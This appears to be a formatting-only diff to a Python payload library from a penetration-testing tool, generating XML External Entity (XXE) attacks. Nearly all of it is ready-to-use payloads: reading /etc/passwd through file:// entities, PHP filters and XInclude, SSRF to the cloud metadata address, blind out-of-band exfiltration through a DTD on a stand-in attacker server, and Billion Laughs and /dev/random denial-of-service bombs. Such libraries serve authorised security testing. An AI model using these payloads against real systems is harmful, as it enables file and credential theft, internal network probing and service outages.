@@ -5,15 +5,17 @@ AIPT XXE Payloads
 XML External Entity (XXE) Injection payloads for security testing.
 Covers file disclosure, SSRF, DoS, and blind XXE detection.
 """
+
 from __future__ import annotations
 
-from typing import Iterator
 from dataclasses import dataclass
+from typing import Iterator
 
 
 @dataclass
 class XXEPayload:
     """XXE payload with metadata."""
+
     payload: str
     name: str
     category: str
@@ -70,92 +72,88 @@ class XXEPayloads:
         payloads = [
             # Basic XXE - DOCTYPE with ENTITY
             XXEPayload(
-                payload=f'''<?xml version="1.0" encoding="UTF-8"?>
+                payload=f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file://{target_file}">
 ]>
-<root>&xxe;</root>''',
+<root>&xxe;</root>""",
                 name="basic_file_xxe",
                 category="file_disclosure",
-                description=f"Basic XXE to read {target_file}"
+                description=f"Basic XXE to read {target_file}",
             ),
-
             # XXE with nested element
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE data [
   <!ENTITY file SYSTEM "file://{target_file}">
 ]>
-<data><content>&file;</content></data>''',
+<data><content>&file;</content></data>""",
                 name="nested_element_xxe",
                 category="file_disclosure",
-                description="XXE with nested content element"
+                description="XXE with nested content element",
             ),
-
             # PHP filter for base64 encoding (bypasses some parsers)
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="php_filter_xxe",
                 category="file_disclosure",
-                description="XXE using PHP filter for base64 encoding"
+                description="XXE using PHP filter for base64 encoding",
             ),
-
             # UTF-16 encoding bypass
             XXEPayload(
-                payload=f'''<?xml version="1.0" encoding="UTF-16"?>
+                payload=f"""<?xml version="1.0" encoding="UTF-16"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file://{target_file}">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="utf16_xxe",
                 category="file_disclosure",
-                description="XXE with UTF-16 encoding to bypass filters"
+                description="XXE with UTF-16 encoding to bypass filters",
             ),
-
             # CDATA wrapper for special characters
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file://{target_file}">
 ]>
-<foo><![CDATA[&xxe;]]></foo>''',
+<foo><![CDATA[&xxe;]]></foo>""",
                 name="cdata_xxe",
                 category="file_disclosure",
-                description="XXE with CDATA section"
+                description="XXE with CDATA section",
             ),
-
             # Parameter entity for internal subset
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file://{target_file}">
   <!ENTITY % eval "<!ENTITY xxe SYSTEM 'file://{target_file}'>">
   %eval;
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="parameter_entity_xxe",
                 category="file_disclosure",
-                description="XXE using parameter entities"
+                description="XXE using parameter entities",
             ),
-
             # XInclude attack (when DOCTYPE is disabled)
             XXEPayload(
-                payload=f'''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+                payload=f"""<foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file://{target_file}"/>
-</foo>''',
+</foo>""",
                 name="xinclude_xxe",
                 category="file_disclosure",
-                description="XInclude attack (bypasses DOCTYPE restrictions)"
+                description="XInclude attack (bypasses DOCTYPE restrictions)",
             ),
         ]
         yield from payloads
 
     @classmethod
-    def ssrf(cls, callback_url: str = "http://169.254.169.254/latest/meta-data/") -> Iterator[XXEPayload]:
+    def ssrf(
+        cls, callback_url: str = "http://169.254.169.254/latest/meta-data/"
+    ) -> Iterator[XXEPayload]:
         """
         SSRF via XXE - make server-side requests.
 
@@ -178,14 +176,14 @@ class XXEPayloads:
 
         for url in urls:
             yield XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "{url}">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name=f"ssrf_xxe_{url.split('/')[2].replace('.', '_')[:20]}",
                 category="ssrf",
-                description=f"XXE SSRF to {url[:50]}"
+                description=f"XXE SSRF to {url[:50]}",
             )
 
     @classmethod
@@ -200,56 +198,53 @@ class XXEPayloads:
         payloads = [
             # Basic OOB XXE
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://{attacker_server}/xxe.dtd">
   %xxe;
 ]>
-<foo>test</foo>''',
+<foo>test</foo>""",
                 name="basic_oob_xxe",
                 category="blind",
-                description="Basic blind XXE with external DTD"
+                description="Basic blind XXE with external DTD",
             ),
-
             # OOB with data exfiltration
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % dtd SYSTEM "http://{attacker_server}/exfil.dtd">
   %dtd;
 ]>
-<foo>&send;</foo>''',
+<foo>&send;</foo>""",
                 name="oob_exfil_xxe",
                 category="blind",
-                description="Blind XXE with data exfiltration"
+                description="Blind XXE with data exfiltration",
             ),
-
             # Error-based XXE (data in error message)
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
 ]>
-<foo>test</foo>''',
+<foo>test</foo>""",
                 name="error_based_xxe",
                 category="blind",
-                description="Error-based XXE (file content in error)"
+                description="Error-based XXE (file content in error)",
             ),
-
             # DNS-based detection
             XXEPayload(
-                payload=f'''<?xml version="1.0"?>
+                payload=f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "http://xxe.{attacker_server}/">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="dns_xxe",
                 category="blind",
-                description="DNS-based XXE detection"
+                description="DNS-based XXE detection",
             ),
         ]
         yield from payloads
@@ -263,7 +258,7 @@ class XXEPayloads:
         payloads = [
             # Billion Laughs (XML Bomb) - exponential expansion
             XXEPayload(
-                payload='''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
@@ -271,41 +266,40 @@ class XXEPayloads:
   <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
   <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 ]>
-<lolz>&lol5;</lolz>''',
+<lolz>&lol5;</lolz>""",
                 name="billion_laughs",
                 category="dos",
-                description="Billion Laughs XML Bomb (exponential expansion)"
+                description="Billion Laughs XML Bomb (exponential expansion)",
             ),
-
             # Quadratic Blowup
             XXEPayload(
-                payload='''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
 ]>
-<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>''',
+<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>""",
                 name="quadratic_blowup",
                 category="dos",
-                description="Quadratic Blowup attack"
+                description="Quadratic Blowup attack",
             ),
-
             # External entity recursion
             XXEPayload(
-                payload='''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///dev/random">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="dev_random_dos",
                 category="dos",
-                description="DoS via /dev/random (infinite read)"
+                description="DoS via /dev/random (infinite read)",
             ),
         ]
         yield from payloads
 
     @classmethod
-    def all_payloads(cls, target_file: str = "/etc/passwd",
-                     callback_url: str = "http://ATTACKER/") -> Iterator[XXEPayload]:
+    def all_payloads(
+        cls, target_file: str = "/etc/passwd", callback_url: str = "http://ATTACKER/"
+    ) -> Iterator[XXEPayload]:
         """Generate all XXE payloads."""
         yield from cls.file_disclosure(target_file)
         yield from cls.ssrf(callback_url)
@@ -321,37 +315,35 @@ class XXEPayloads:
         payloads = [
             # Simple entity expansion test
             XXEPayload(
-                payload='''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe "XXE_VULNERABLE">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="entity_expansion_test",
                 category="detection",
-                description="Test if internal entities are processed"
+                description="Test if internal entities are processed",
             ),
-
             # External DTD test
             XXEPayload(
-                payload='''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE foo SYSTEM "http://xxe-test.attacker.com/test.dtd">
-<foo>test</foo>''',
+<foo>test</foo>""",
                 name="external_dtd_test",
                 category="detection",
-                description="Test if external DTDs are fetched"
+                description="Test if external DTDs are fetched",
             ),
-
             # Parameter entity test
             XXEPayload(
-                payload='''<?xml version="1.0"?>
+                payload="""<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % test "XXE_PARAM_ENTITY">
   <!ENTITY xxe "%test;">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
                 name="param_entity_test",
                 category="detection",
-                description="Test if parameter entities work"
+                description="Test if parameter entities work",
             ),
         ]
         yield from payloads
